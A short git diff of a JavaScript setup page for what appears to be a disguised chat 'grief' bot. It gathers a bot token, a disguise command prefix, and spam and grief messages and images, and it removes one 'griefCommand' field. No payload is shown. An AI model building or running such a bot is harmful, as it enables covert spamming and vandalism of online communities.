@@ -19,7 +19,7 @@ window.onload = function () {
             spamMessage = (spamMessage == "") ? document.getElementById("spamMessage").placeholder : spamMessage;
             griefPicture = (griefPicture == "") ? document.getElementById("griefPicture").placeholder : griefPicture;
 
-            const jsonObj = { botToken: botToken, userID: userID, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix, griefCommand: griefCommand, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture };
+            const jsonObj = { botToken: botToken, userID: userID, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture };
             sendRequest("setup?value=" + btoa(JSON.stringify(jsonObj)), null);
             document.getElementById("alert-success").hidden = false;
         } else {
